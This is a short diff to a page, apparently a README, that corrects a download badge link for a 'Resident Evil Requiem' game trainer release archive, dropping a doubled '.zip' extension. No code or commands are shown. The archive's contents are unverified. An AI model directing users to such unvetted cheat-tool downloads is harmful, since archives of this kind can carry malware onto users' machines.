@@ -16,7 +16,7 @@
 
   <br>
 
-  <a href="https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainers_v1.0.7.zip.zip">
+  <a href="https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainers_v1.0.7.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD%20Resident%20Evil%20Requiem%20Trainer%20v1.0.7-00C853?style=for-the-badge&logo=windows&logoColor=white" alt="Download RE9 Trainer v1.0.7">
   </a>
 
